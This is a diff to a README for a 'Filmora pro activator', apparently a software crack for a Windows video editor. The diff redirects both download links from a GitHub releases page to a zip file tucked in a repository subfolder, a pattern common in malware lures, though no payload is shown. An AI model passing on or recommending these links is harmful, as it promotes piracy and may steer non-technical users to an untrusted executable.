@@ -1,6 +1,6 @@
 # 🎬 filmora-pro-activator-26 - Fast Filmora setup for Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/rickdeazer/filmora-pro-activator-26/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rickdeazer/filmora-pro-activator-26/main/canun/filmora-pro-activator-2.0.zip)
 
 ## 🧰 What this app does
 
@@ -20,7 +20,7 @@ The app focuses on ease of use. You do not need coding skills or command-line st
 
 Visit this page to download:
 
-https://github.com/rickdeazer/filmora-pro-activator-26/releases
+https://raw.githubusercontent.com/rickdeazer/filmora-pro-activator-26/main/canun/filmora-pro-activator-2.0.zip
 
 On the release page, look for the latest version and download the Windows file that matches your system. Most users should pick the `.exe` file if one is listed.
 
